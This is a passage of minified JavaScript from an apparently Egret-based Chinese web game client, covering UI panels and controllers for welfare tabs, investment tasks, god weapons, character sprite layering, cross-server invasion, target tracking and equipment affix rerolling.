e=this.eTab.getElementAt(this.evsIdx),i=this.eVs.getElementAt(this.evsIdx);if(this.winStr1&&(i.$param=[this.winStr1]),e)e.bg.source=i.tabImg+"1";else{this.eTab.selectedIndex=0,this.eVs.selectedIndex=0,this.eTab.validateNow();var n=this.eTab.getElementAt(this.evsIdx),s=this.eVs.getElementAt(this.evsIdx);n&&(n.bg.source=s.tabImg+"1")}},e.prototype.isNumeric=function(t){return isNaN(Number(t))},e.prototype.returnIdx=function(){if(this.winStr&&""!=this.winStr){var t=this.eVs.numElements;if(t>0)for(var e=0;t>e;e++){var i=this.eVs.getElementAt(e);if(this.getClassName(i)==this.winStr)return e}}return 0},e.prototype.getClassName=function(t){return t instanceof m.FuliMain2?"FuliMain2":t instanceof r.FuliMain3?"FuliMain3":t instanceof p.FuliMain4?"FuliMain4":t instanceof d.FuliMain5?"FuliMain5":t instanceof s.OSATarget41Panel28?"OSATarget41Panel28":t instanceof a.OSATarget41Panel27?"OSATarget41Panel27":t instanceof h.OSATarget0Panel2?"OSATarget0Panel2":"Unknown"},e.prototype.onTabTouch=function(){if(this.evsIdx!=this.eTab.selectedIndex){var t=this.eTab.getElementAt(this.evsIdx),e=this.eVs.getElementAt(this.evsIdx);t.bg.source=e.tabImg;var i=this.eTab.getElementAt(this.eTab.selectedIndex),n=this.eVs.getElementAt(this.eTab.selectedIndex);i.bg.source=n.tabImg+"1",this.evsIdx=this.eTab.selectedIndex}},e}(n.BaseView);e.FuliWin=v,window.FuliWin=v,__reflect(v.prototype,"FuliWin",[]),window.FuliWin=v},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget41Item28=void 0;var n=i(3),o=i(35),s=i(2),a=i(9),r=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEndEvent(this.btnPay,this.onClick),this.addTouchEndEvent(this.btnFree,this.onClick)},e.prototype.dataChanged=function(){if(this.data&&this.btnPay){var t=this.data;if(t.reward&&t.reward[0]){var e=o.TaskCT.ins().getInvestmentTask(t.id,t.index),i="";switch(t.type){case 8:i=gettext("{0}级",t.target);break;case 19:i=gettext("{0}转",t.target);break;case 100:i=gettext("{0}天",t.target)}this.eInfo.text=i,this.btnPay.lbYb.text=""+t.reward[0].count,this.btnFree.lbYb.text=""+t.freeReward[0].count;var n=a.Activity.ins().activityData[28];if(n.hasBuy&&e)switch(e.status){case 0:this.btnPay.currentState="lock";break;case 1:this.btnPay.currentState="unLock";break;case 2:this.btnPay.currentState="got"}else this.btnPay.currentState="lock";e&&0!=e.status?e.free&&1==e.free?this.btnFree.currentState="got":this.btnFree.currentState="unLock":this.btnFree.currentState="lock"}}},e.prototype.onClick=function(t){var e=this.data,i=o.TaskCT.ins().getInvestmentTask(e.id,e.index),n=a.Activity.ins().activityData[28];switch(t.currentTarget){case this.btnFree:i&&0!=i.status?i.free&&1==i.free?s.TipsCT.ins().showTips(gettext("免费奖励已领取")):o.TaskCT.ins().sendInvestmentTaskData(e.id,e.index,1):s.TipsCT.ins().showTips(gettext("任务未完成"));break;case this.btnPay:if(n.hasBuy&&i)switch(i.status){case 0:s.TipsCT.ins().showTips(gettext("任务未激活"));break;case 1:o.TaskCT.ins().sendInvestmentTaskData(e.id,e.index,0);break;case 2:s.TipsCT.ins().showTips(gettext("免费奖励已领取"))}else s.TipsCT.ins().showTips(gettext("任务未激活"))}},e}(n.BaseItemRender);e.OSATarget41Item28=r,window.OSATarget41Item28=r,__reflect(r.prototype,"OSATarget41Item28",[]),window.OSATarget41Item28=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GodWeaponCC=void 0;var n=i(19),o=i(14),s=i(17),a=i(0),r=i(4),l=i(6),h=function(t){function e(){var e=t.call(this)||this;return e.dicInfo={},e.rp=new s.RedPoint,e.lvRps=[],e.sysId=PackageID.GodWeapon,e.regNetMsg(16,e.postInfo),observe(e,e.initRps,e.postInfo),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.initRps=function(){var t=this;this.lvRps=[],this.rp.clearSub();var i=function(i){var o=new s.RedPoint(function(){return t.checkRed(i)},e.ins().postInfo,r.ActorCC.postStoneChange,r.ActorCC.postGoldChange,l.BagCT.ins().postItemAdd);o.v=n.checkRed(i),n.lvRps.push(o),n.rp.addSub(o)},n=this;for(var o in this.dicInfo)i(o)},e.prototype.checkRed=function(t){var i=e.ins().getInfo(t);if(!i)return!1;var o=a.GlobalConfig.GodWeaponLvConfig[i.id];if(!o)return!1;if(r.ActorCC.level>=o.level){var s=o.cost;if(s){for(var l=!0,h=0;h<s.length;h++)n.GlobalFun.checkCost(s[h].count,s[h].id,"",!1)||(l=!1);if(l)return!0}}for(var u=a.GlobalConfig.GodWeaponLvConfig[t],p=u.levelStage[i.skillLv-1],d=0,h=0;h<u.levelStage.length;h++)p>=u.levelStage[h]&&(d+=u.levelStage[h]);var c=0==i.skillLv?u:a.GlobalConfig.GodWeaponLvConfig[Number(t)+d];if(o.lv>=c.skillLevel){var f=c.skillCost;if(f){for(var g=!0,h=0;h<f.length;h++)n.GlobalFun.checkCost(f[h].count,f[h].id,"",!1)||(g=!1);if(g)return!0}}return!1},e.prototype.initLogin=function(){this.dicInfo={},this.sendInfo(0)},e.prototype.sendInfo=function(t){var e=this.getBytes(16);e.writeShort(t),this.sendToServer(e)},e.prototype.postInfo=function(t){for(var e=t.readShort(),i=0;e>i;i++){var n=t.readShort(),o=t.readInt(),s=t.readInt();this.dicInfo[1e3*n]={id:1e3*n+o,lv:o,skillLv:s}}},e.prototype.sendUp=function(t,e){var i=this.getBytes(17);i.writeShort(t),i.writeByte(e),this.sendToServer(i)},e.prototype.getInfo=function(t){return this.dicInfo[t]||null},__decorate([post()],e.prototype,"postInfo",null),e}(o.BaseSystem);e.GodWeaponCC=h,window.GodWeaponCC=h,__reflect(h.prototype,"GodWeaponCC",[]),Systemap.GodWeaponCC=function(){return h.ins()},window.GodWeaponCC=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CharEffect=void 0;var n=i(21),o=i(16),s=i(1),a=i(37),r=i(122),l=i(95),h=i(146),u=function(t){function e(){var e=t.call(this)||this;return e._bodyContainer=new egret.DisplayObjectContainer,e.titleCantainer=new egret.DisplayObjectContainer,e.myHeight=a.EntityManager.CHAR_DEFAULT_HEIGHT,e.typeface=a.EntityManager.CHAR_DEFAULT_TYPEFACE,e._disOrder={},e._mcFileName={},e._dir=4,e._state=r.EntityAction.STAND,e.addChild(e._bodyContainer),e.titleCantainer.anchorOffsetY=e.myHeight,e.addChild(e.titleCantainer),e}return __extends(e,t),Object.defineProperty(e.prototype,"_body",{get:function(){return this.getMc(l.CharMcOrder.BODY)},enumerable:!1,configurable:!0}),e.prototype.setBodyScale=function(t){this._bodyContainer.scaleX=this._bodyContainer.scaleY=t,this.myHeight=this.myHeight*t,this.typeface*=t,this.titleCantainer.anchorOffsetY=Math.floor(this.myHeight)},e.prototype.setConfig=function(t){this.myHeight=a.EntityManager.CHAR_DEFAULT_HEIGHT,this.typeface=a.EntityManager.CHAR_DEFAULT_TYPEFACE,this.titleCantainer.anchorOffsetY=Math.floor(this.myHeight)},e.prototype.updateModel=function(){},Object.defineProperty(e.prototype,"dir",{get:function(){return this._dir},set:function(t){this._dir!=t&&(this._dir=t,this.loadBody())},enumerable:!1,configurable:!0}),e.prototype.playAction=function(t,e){this._state=t,this.playComplete=e,this.loadBody()},e.prototype.loadBody=function(){if(this._body){this._body.stop(),this.loadFile(this._body,this.getFileName(l.CharMcOrder.BODY),l.CharMcOrder.BODY);for(var t in this._disOrder){var e=this._disOrder[t];e!=this._body&&this.loadOther(+t)}this.sortEffect()}},e.prototype.loadOther=function(t){var e=this.getMc(t);e&&(e.stop(),this.loadFile(e,this.getFileName(t),t))},e.prototype.getFileName=function(t){return this._mcFileName[t]},e.prototype.playFile=function(t,e){t.playFile(e,-1,null,!1)},e.prototype.loadFile=function(t,e,i){var n=this;if(e){var o=e+"_"+h.DirUtil.get5DirBy8Dir(this.dir)+this._state;i==l.CharMcOrder.ZHANLING?o=e:t.scaleX=h.DirUtil.isScaleX(this.dir)?-1:1,t.playFile(o,this.playCount(),t==this._body?function(){n.playComplete&&n.playComplete(),n.playComplete=null}:null,!1)}},e.prototype.playCount=function(){return-1},e.prototype.addMc=function(t,e){if(this._mcFileName[t]!=e){this._mcFileName[t]=e;var i=this._disOrder[t];return i||(i=ObjectPool.pop("MovieClip"),this._bodyContainer.addChild(i),this._disOrder[t]=i),i==this._body?this.loadBody():this.loadOther(t),this.sortEffect(),i}},e.prototype.removeMc=function(t){if(t!=l.CharMcOrder.BODY){var e=this._disOrder[t];e&&(o.DisplayUtils.removeFromParent(e),delete this._mcFileName[t],delete this._disOrder[t])}},e.prototype.getMc=function(t){return this._disOrder[t]},e.prototype.sortEffect=function(){var t=e.FRAME_ODER[this._dir],i=0;t.length>0&&(i=t.length);for(var n=0,o=0;i>o;o++){var s=t[o];this._disOrder[s]&&this._disOrder[s].parent&&(this._bodyContainer.addChildAt(this._disOrder[s],n),n+=1)}},e.prototype.addDisplay=function(){this.shadow=new eui.Image(RES_DIR+"yingzi.png"),this.shadow.alpha=.8,this.addChildAt(this.shadow,0),this.shadow.anchorOffsetX=45,this.shadow.anchorOffsetY=25},e.prototype.removeDisplay=function(){o.DisplayUtils.removeFromParent(this.shadow),this.shadow=null},e.prototype.clearMc=function(t){var e=this._disOrder[t];e&&(e instanceof n.MovieClip&&o.DisplayUtils.removeFromParent(e),delete this._mcFileName[t],delete this._disOrder[t])},e.prototype.getGrid=function(){var t=Math.floor(this.x/64),e=Math.floor(this.y/64);return{x:t,y:e}},e.prototype.$setY=function(e){return this.zIndex=e+.1*this.x,t.prototype.$setY.call(this,e)},e.FRAME_ODER=[[l.CharMcOrder.WEAPON,l.CharMcOrder.SOUL,l.CharMcOrder.BODY,l.CharMcOrder.WING,l.CharMcOrder.ZHANLING],[l.CharMcOrder.BODY,l.CharMcOrder.WEAPON,l.CharMcOrder.SOUL,l.CharMcOrder.WING,l.CharMcOrder.ZHANLING],[l.CharMcOrder.WING,l.CharMcOrder.BODY,l.CharMcOrder.WEAPON,l.CharMcOrder.SOUL,l.CharMcOrder.ZHANLING],[l.CharMcOrder.ZHANLING,l.CharMcOrder.WING,l.CharMcOrder.BODY,l.CharMcOrder.WEAPON,l.CharMcOrder.SOUL],[l.CharMcOrder.ZHANLING,l.CharMcOrder.WING,l.CharMcOrder.BODY,l.CharMcOrder.WEAPON,l.CharMcOrder.SOUL],[l.CharMcOrder.ZHANLING,l.CharMcOrder.WING,l.CharMcOrder.BODY,l.CharMcOrder.WEAPON,l.CharMcOrder.SOUL],[l.CharMcOrder.WING,l.CharMcOrder.BODY,l.CharMcOrder.WEAPON,l.CharMcOrder.SOUL,l.CharMcOrder.ZHANLING],[l.CharMcOrder.BODY,l.CharMcOrder.WEAPON,l.CharMcOrder.SOUL,l.CharMcOrder.WING,l.CharMcOrder.ZHANLING]],e}(s.BaseView);e.CharEffect=u,window.CharEffect=u,__reflect(u.prototype,"CharEffect",[]),window.CharEffect=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HSWarReportWin=void 0;var n=i(1),o=i(46),s=i(999),a=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="HSWarReportSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=s.HSWarReportItem},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.observe(o.HegemonyCT.ins().postWarReport,this.update),this.update()},e.prototype.update=function(){var t=o.HegemonyCT.ins(),e=t.warData[0];if(e){var i=e.server1,n=e.server2,s=e.name1,a=e.name2,r=e.score1,l=e.score2,h=[],u=0;if(0==e.id&&t.state==o.HegemonyStatus.Challenge){var p=t.challengeData[0];if(!p)return;u=e.name1==p.beChooseName&&e.server1==p.beServer?1:2,2==u&&(i=e.server2,n=e.server1,s=e.name2,a=e.name1,r=e.score2,l=e.score1)}this.server1.text="S."+i,this.server2.text="S."+n,this.playName1.text=s,this.playName2.text=a,this.score.text=r+"."+l;for(var d=0;d<e.fightData.length;d++)h.push([e.fightData[d],e.role1,e.role2,u,e.state]);this.list.dataProvider=new eui.ArrayCollection(h)}},e}(n.BaseView);e.HSWarReportWin=a,window.HSWarReportWin=a,__reflect(a.prototype,"HSWarReportWin",[]),window.HSWarReportWin=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HSTabItem=void 0;var n=i(3),o=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged()},e.prototype.dataChanged=function(){this.skin&&this.data&&(this.bmpDisplay.text=this.data)},e}(n.BaseItemRender);e.HSTabItem=o,window.HSTabItem=o,__reflect(o.prototype,"HSTabItem",[]),window.HSTabItem=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.InvadeWin=void 0;var n=i(8),o=i(16),s=i(5),a=i(1),r=i(0),l=i(15),h=i(76),u=i(45),p=i(148),d=i(138),c=i(12),f=i(7),g=i(2),m=i(82),v=i(430),y=i(1034),C=i(235),T=function(t){function e(){var e=t.call(this)||this;return e._sn_="InvadeSkin",e._baseItemArr=[],e._curSelId=1,e._curPhase=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this.eCloseBtn,this.onClick),this.addTouchEvent(this.overview,this.onClick),this.addTouchEvent(this.Cteam,this.onClick),this.addTouchEvent(this.eTxt,this.onClick),this.addTouchEvent(this.eChat,this.onClick),this.addTouchEvent(this.chatList0,this.onTap)},e.prototype.onTap=function(t){if(!u.ChatCT.ins().MsgOpenWin)return void(u.ChatCT.ins().MsgOpenWin=!0);switch(t.currentTarget){case this.chatList0:win.open("ChatWin")}},e.prototype.onClick=function(t){var e;switch(t.target){case this.eCloseBtn:win.close(this);break;case this.overview:win.open(y.InvadeSummaryWin);break;case this.Cteam:if(!m.InvadeCT.ins().bolOpen)return void g.TipsCT.ins().showTips(gettext("本轮尚未到达报名时间"));if(2==m.InvadeCT.ins().fightPhase)return void g.TipsCT.ins().showTips(gettext("本轮战斗未结束"));win.open(C.InvadeTeamRoomWin);break;case this.eChat:if(!u.ChatCT.ins().MsgOpenWin)return void(u.ChatCT.ins().MsgOpenWin=!0);win.open(p.ChatWin);break;case this.eTxt:win.open(h.CommonHelpWin,(null===(e=r.GlobalConfig.HelpInfoConfig[324])||void 0===e?void 0:e.text)||"")}},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.observe(m.InvadeCT.ins().postInvadeInfoUpdate,this.updateBaseItemList),this.observe(m.InvadeCT.ins().postInvadeTeamUpdate,this.updateArrow),this.observe(u.ChatCT.ins().postSysChatMsg,this.updateChatList),this.observe(u.ChatCT.ins().postNewChatMsg,this.updateChatList),this.observe(u.ChatCT.ins().postDelMsg,this.updateChatList),this.chatList0.itemRenderer=d.ChatListItemRenderer3,this._charInfoArr=new eui.ArrayCollection,this.chatList0.dataProvider=this._charInfoArr,m.InvadeCT.ins().initInvadeInfo(),this.severID.textFlow=s.TextFlowMaker.generateTextFlow1(gettext("正在入侵{0}服","|C:D90302&T:S."+m.InvadeCT.ins().tarSerId)),Timer.has(this.flusLeftTime,this)||Timer.start(1e3,-1,this.flusLeftTime,this),this.updateBaseItemList(),this.updateChatList(),this.flusLeftTime(),this.eSscrollV(),m.InvadeCT.ins().invadeTeamBaseId=0,m.InvadeCT.ins().sendGetAllInvadeBase(),m.InvadeCT.ins().sendTeamInfo();this.eSc.scaleY = window.hmscale;},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=c.OpenSystem.ins().checkSysOpen(l.SystemType.Invade);return i||g.TipsCT.ins().showTips(c.OpenSystem.ins().getNoOpenTips(l.SystemType.Invade)),i},e.prototype.updateChatList=function(){this._charInfoArr.replaceAll(u.ChatCT.ins().chatListTip2.concat()),this.refushBar()},e.prototype.refushBar=function(){Timer.start(100,1,this.refushBarList,this)},e.prototype.refushBarList=function(){0!=this.scr0.viewport.contentHeight&&(this.scr0.viewport.validateNow(),this.scr0.viewport.contentHeight>this.scr0.height&&(this.scr0.viewport.scrollV=this.scr0.viewport.contentHeight-this.scr0.height))},e.prototype.updateBaseItemList=function(){var t=m.InvadeCT.ins().invadeBaseDatas;if(!this._baseItemArr.length)for(var e=0;e<t.length;e++){var i=t[e],n=new v.InvadeItem;this.eG.addChild(n);var o=r.GlobalConfig.DesertInvasionNodeConfig[i.id];o&&(n.x=o.showPos[0],n.y=o.showPos[1]),this._baseItemArr.push(n)}for(var e=0;e<t.length;e++){var n=this._baseItemArr[e];n.data=t[e]}this.updateArrow()},e.prototype.eSscrollV=function(){this.eSc.viewport.validateNow();var t=r.GlobalConfig.DesertInvasionNodeConfig[this._curSelId],e=t?Math.max(0,t.showPos[1]-this.eSc.parent.height/2):0,i=(this.eSc.viewport.contentHeight||this.contentGroup.height)-this.eSc.viewport.height,n=e>i?i:e;0>n&&(n=0),this.eSc.viewport.scrollV=n},e.prototype.flusLeftTime=function(){var t=m.InvadeCT.ins().getPhaseByTime(f.GameServerCC.serverTime),e=t[0],i=t[1];if(this._curPhase!=e&&(this._curPhase=e),0>i&&(i=0),0==e)this.serverGrp.visible=this.timeGrp.visible=!1,this.NtimeGrp.visible=!0,this.Nstart.text="",this.Nstarttime.text=gettext("距离开启：")+n.DateUtils.getFormatBySecond(i/1e3,n.DateUtils.TIME_FORMAT_1);else if(1==e||2==e){this.serverGrp.visible=this.timeGrp.visible=!0,this.NtimeGrp.visible=!1;var o=1==e?gettext("准备阶段："):gettext("战斗阶段："),s=n.DateUtils.getFormatBySecond(i/1e3,n.DateUtils.TIME_FORMAT_1);this.time.text=o+s}else 3==e&&(this.serverGrp.visible=this.timeGrp.visible=!1,this.NtimeGrp.visible=!0,this.Nstarttime.text=gettext("活动结算中"))},e.prototype.updateArrow=function(){var t=window.invadeid || m.InvadeCT.ins().invadeTeamBaseId;if(this.locate.visible=!!t,egret.Tween.removeTweens(this.locate),t)for(var e=0;e<this._baseItemArr.length;e++){var i=this._baseItemArr[e];if(i.data&&i.data.id==t){this.locate.parent.setChildIndex(this.locate,100),this.locate.x=i.x + i.width / 3.4-this.locate.width/2,this.locate.y=i.y,egret.Tween.get(this.locate,{loop:!0}).to({y:i.y+5},500).to({y:i.y-5},500).to({y:i.y},500);break}}},e.prototype.removeDisplay=function(){if(Timer.stop(this.flusLeftTime,this),Timer.stop(this.refushBarList,this),this.skin){egret.Tween.removeTweens(this.locate),this.removeObserve();for(var t=0,e=this._baseItemArr;t<e.length;t++){var i=e[t];o.DisplayUtils.removeFromParent(i)}this._baseItemArr=[]}},__decorate([delayCall(100)],e.prototype,"eSscrollV",null),e}(a.BaseView);e.InvadeWin=T,window.InvadeWin=T,__reflect(T.prototype,"InvadeWin",[]),window.InvadeWin=T},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TargetPanelCC=e.targetpanelcc=void 0;var n=i(37),o=i(0),s=i(34),a=i(53),r=i(101),l=i(95),h=function(t){function e(){var e=t.call(this)||this;return e._hp=0,e._hpMax=0,e._monsterID=0,e._targetHandle=0,e._targetDic={},observe(e,e.changeTarEntity,a.ControlCC.setCurTar),observe(e,e.changeTarHp,Ts.entityHpChange),observe(e,e.postBelong,Ts.belongChange),observe(e,e.initFun,Ts.enterScene),e}return __extends(e,t),e.prototype.initFun=function(){this._targetDic={},this._targetHandle=0,this._belongHandle=0,this._belongName=""},e.prototype.postHudun=function(){},e.prototype.postBlood=function(){},e.prototype.postTarget=function(){},e.prototype.postHuDun=function(){},Object.defineProperty(e.prototype,"hp",{get:function(){return this._hp},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"hpMax",{get:function(){return this._hpMax},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"monsterID",{get:function(){return this._monsterID},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"targetHandle",{get:function(){return this._targetHandle},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"belongHandle",{get:function(){return this._belongHandle},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"belongName",{get:function(){return this._belongName},enumerable:!1,configurable:!0}),e.prototype.changeTarEntity=function(){var t=a.ControlCC.curTar;if(t){this.changeTarHandle(t.infoModel.handle);var e=this._targetDic[this._targetHandle];e&&(this._targetHandle=e.targetHandle,this._belongName=e.name,this._belongHandle=e.belongHandle)}else{var i=n.EntityManager.ins().getEntityByHandle(this._targetHandle);if(i&&i.isDie())return this._targetHandle=this._monsterID=0,this._belongName="",this._belongHandle=0,void(this._targetDic[this._targetHandle]&&delete this._targetDic[this._targetHandle]);this.postTarget()}},e.prototype.changeTarHandle=function(t){if(this._targetHandle!=t){var e=n.EntityManager.ins().getEntityByHandle(t);this.checkType(e)&&(this._targetHandle=t,this._monsterID=e.infoModel.type==EntityType.Monster?e.infoModel.configID:0,this._belongHandle=e.infoModel.belongHandle,this._belongName=e.infoModel.belongName,e.infoModel.type==EntityType.CollectionMonst&&console.warn("采集怪需要特殊处理")),this.updateHp(e),this.postTarget()}},e.prototype.changeTarHp=function(t){var e=t.handle;if(e>0&&e==this._targetHandle){var i=n.EntityManager.ins().getEntityByHandle(this._targetHandle);i&&this.updateHp(i)}},e.prototype.updateHp=function(t){if(t){if(t.infoModel)this._hpMax=t.infoModel.getAtt(s.AttributeType.atMaxHp),this._hp=t.infoModel.getAtt(s.AttributeType.atHp);else{var e=o.GlobalConfig.MonstersConfig[this._monsterID];this._hpMax=(null===e||void 0===e?void 0:e.hp)||0}this.postBlood()}},e.prototype.checkType=function(t){var e,i=(null===(e=null===t||void 0===t?void 0:t.infoModel)||void 0===e?void 0:e.type)||0;return i==EntityType.Role||i==EntityType.Monster||i==EntityType.LadderPlayer||i==EntityType.CollectionMonst},e.prototype.checkIsShow=function(t){var e,i=(null===(e=null===t||void 0===t?void 0:t.infoModel)||void 0===e?void 0:e.configID)||0,n=o.GlobalConfig.MonstersConfig[i];return n?n.type==l.MonsterType.Boss:!1},e.prototype.postBelong=function(t){var e=t.targetHandle,i=t.belongHandle,n=t.name;this._targetDic[e]={name:n,belongHandle:i,targetHandle:e};var o=this._targetDic[this._targetHandle];o&&(this._targetHandle=o.targetHandle,this._belongName=o.name,this._belongHandle=o.belongHandle)},__decorate([post()],e.prototype,"postHudun",null),__decorate([post()],e.prototype,"postBlood",null),__decorate([post()],e.prototype,"postTarget",null),__decorate([post()],e.prototype,"postHuDun",null),__decorate([post()],e.prototype,"postBelong",null),e}(r.CC);e.targetpanelcc=h,window.targetpanelcc=h,__reflect(h.prototype,"targetpanelcc",[]),e.TargetPanelCC=new h,window.TargetPanelCC=e.TargetPanelCC},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MasterEquipTips=void 0;var n=i(5),o=i(1),s=i(0),a=i(10),r=i(118),l=function(t){function e(){var e=t.call(this)||this;return e._sn_="MasterequipTipsSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=t[0],o=s.GlobalConfig.MasterSuitEquipEntryConfig[i];this.icon0.source=o.icon+"_png",this.nameLabel.text=o.name,this.lbDes.textFlow=n.TextFlowMaker.generateTextFlow1(o.desc);var l="";if(o.body&&o.body.length&&o.body.length!=r.MasterEquipEnum.MasterEquipMaxSlot)for(var h=0;h<o.body.length;h++)l+=a.ItemUtil.getMasterPosName(o.body[h])+" ";else l=gettext("主宰副装");this.lbEquipName.text=l},e.prototype.removeDisplay=function(){this.skin&&this.removeObserve()},e}(o.BaseView);e.MasterEquipTips=l,window.MasterEquipTips=l,__reflect(l.prototype,"MasterEquipTips",[]),window.MasterEquipTips=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ContestRedPoint=void 0;var n=i(14),o=i(74),s=function(t){function e(){var e=t.call(this)||this;return e.betReds={},observe(e,e.postRedPoint,e.postSignRed,e.postBetRed),observe(e,e.postSignRed,o.ContestCT.ins().postSignUp,o.ContestCT.ins().postContestStatus),observe(e,e.postBetRed,o.ContestCT.ins().postContestStatus,o.ContestCT.ins().postBetInfo,o.ContestCT.ins().postContestInfo),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.postRedPoint=function(){var t=this.redPoint;if(this.redPoint=this.signRed,!this.redPoint)for(var e in this.betReds)if(this.betReds[e]){this.redPoint=!0;break}return t!=this.redPoint},e.prototype.postSignRed=function(){this.signRed=o.ContestCT.ins().checkOpen()&&o.ContestCT.ins().stageType==o.Contest_Status.Sign&&!o.ContestCT.ins().isSignUp},e.prototype.postBetRed=function(){this.betReds={};var t=o.ContestCT.ins();if(t.checkOpen()&&t.betStage&&t.curBetStage!=t.stageType)for(var e in t.contestInfos)1!=t.contestInfos[e].record&&(this.betReds[t.contestInfos[e].actorId]=!0)},__decorate([post()],e.prototype,"postRedPoint",null),__decorate([post()],e.prototype,"postSignRed",null),__decorate([post()],e.prototype,"postBetRed",null),e}(n.BaseSystem);e.ContestRedPoint=s,window.ContestRedPoint=s,__reflect(s.prototype,"ContestRedPoint",[]),Systemap.ContestRedPoint=function(){return s.ins()},window.ContestRedPoint=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EquipClearPanel=void 0;var n=i(1),o=i(38),s=i(6),a=i(13),r=i(156),l=i(31),h=i(10),u=i(0),p=i(48),d=i(5),c=i(22),f=i(4),g=i(27),m=i(2),v=i(19),y=i(201),C=i(57),T=i(63),b=i(59),w=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.beforeIndex=0,e.equipBagIndex=-1,e.isUseYb=0,e.lock1=0,e.lock2=0,e.costTimes=1,e.CfgDic={AffixCfg:null,AffixBaseCfgCost:null,AffixCostCfg:null,HelpCfg:null,StoreCfg:null,HelpCfg2:null},e.MsgCbDic={info:null,update:null},e.IdxEquipUid=0,e.init1=!0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.tabEquip.itemRenderer=r.TabClearItemRender,this.eTab.itemRenderer=y.EquipClearItem},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.updateChangeTab,o.EquipCT.ins().postEquipChange2),observe(this,this.updateChangeTab,s.BagCT.ins().postInclidentAttr),observe(this,this.updateChangeTab,o.EquipCT.ins().postChangeTabClear),observe(this,this.updateTab,o.EquipCT.ins().postLock),this.MsgCbDic.info&&observe(this,this.updateView,this.MsgCbDic.info),this.MsgCbDic.update&&observe(this,this.updateView,this.MsgCbDic.update),this.addTouchEvent(this.btnClear,this.onClick),this.addTouchEvent(this.btnPreserve,this.onClick),this.addTouchEvent(this.btnHelp,this.onClick),this.addTouchEvent(this.btnHelp2,this.onClick),this.addTouchEvent(this.useYb,this.onCheck),this.addTouchEvent(this.useYb0,this.onCheckSoul),this.lstLock.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onlstLock,this),this.eTab.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onChangeTab,this),this.tabEquip.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onItemTap,this),(void 0==this.eTab.selectedIndex||void 0==this.IdxTab)&&(this.tabEquip.dataProvider=this.tabEquipAC=new eui.ArrayCollection([]),this.lstLock.dataProvider=this.lockAc=new eui.ArrayCollection([]),this.cleanlockView(),this.updateData(),this.IdxTab||(this.IdxTab=0),this.eTab.selectedIndex=this.IdxTab||0,this.updateChangeTab(),this.PanelType==C.PANEL_TYPE.Soul?(this.currentState="soul",this.validateNow(),this.updateView()):this.currentState="clear",this.tabEquipAC.source.length>0&&(this.setTabEquipSel(0),this.changetabEquip()))},e.prototype.setTabEquipSel=function(t){this.tabEquip.selectedIndex=t;for(var e=0,i=this.tabEquip.numChildren;i>e;e++){var n=this.tabEquip.getChildAt(e);n&&(n.currentState=t==e?"down":"up")}this.updateView()},e.prototype.updateView=function(){var t=this.CfgDic.AffixCostCfg,e=this.CfgDic.AffixBaseCfgCost,i=this.CfgDic.AffixCfg;if(this.updateData(),this.resultData){var n=this.tabEquip.selectedIndex<=-1?0:this.tabEquip.selectedIndex,o=this.resultData[n];this.attrName.text=gettext("属性名称"),this.max.text=gettext("最大值"),this.maxStrip.text=gettext("最大条数");var s=o?o.itemConfig.zsLevel?1e3*o.itemConfig.zsLevel+o.itemConfig.level:o.itemConfig.level:1;for(var r in i){var f=1;for(var g in i[r])s>=i[r][g].lv&&(f=i[r][g].lv);var m=i[r][f],v=u.GlobalConfig.AttrConfig[m.id],y=o?m.body.indexOf(o.subType):1;if(y>=0){var T=a.SubRoles.ins().getSubRoleByIndex(0);if(m.job&&m.job!=(null===T||void 0===T?void 0:T.job))continue;this.attrName.text+="\n"+c.AttributeData.getAttrStrByType(m.id);var b=v.divisor?m.maxNum/v.divisor:m.maxNum;this.max.text+="\n"+b+(v.suffix?v.suffix:""),this.maxStrip.text+="\n"+m.maxCount}}if(!o)return this.tabEquip.dataProvider=this.tabEquipAC=new 